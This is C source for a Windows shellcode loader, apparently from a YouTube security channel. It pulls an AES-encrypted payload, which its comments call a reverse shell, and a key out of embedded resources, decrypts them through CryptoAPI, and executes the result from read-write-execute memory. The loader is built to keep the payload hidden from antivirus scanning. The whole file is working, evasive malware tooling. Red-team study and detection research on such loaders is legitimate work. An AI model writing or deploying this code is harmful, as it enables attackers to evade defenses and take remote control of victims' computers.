#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>

#pragma comment (lib, "crypt32.lib")

#define IDI_BIN1 102
#define IDI_BIN2 103

void DecryptAES(char* shellcode, DWORD shellcodeLen, char* key, DWORD keyLen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return;
    }
    if (!CryptHashData(hHash, (BYTE*)key, keyLen, 0)) {
        return;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return;
    }

    CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, (BYTE*)shellcode, &shellcodeLen);

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

}

int main() {

	printf("Gemini Cyber Security @ Youtube!");
	//fetch encrypted reverse shell
	HRSRC shellcodeResource = FindResource(NULL, MAKEINTRESOURCE(IDI_BIN1), "BIN1");
	DWORD shellcodeSize = SizeofResource(NULL, shellcodeResource);
	HGLOBAL shellcodeResourceData = LoadResource(NULL, shellcodeResource);

	//fetch aes key
        HRSRC keyResource = FindResource(NULL, MAKEINTRESOURCE(IDI_BIN2), "BIN2");
        DWORD keySize = SizeofResource(NULL, keyResource);
        HGLOBAL keyResourceData = LoadResource(NULL, keyResource);

	DecryptAES((char*)shellcodeResourceData, shellcodeSize, (char*)keyResourceData, keySize);

	void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, shellcodeResourceData, shellcodeSize);
	((void(*)())exec)();

	return 0;
}
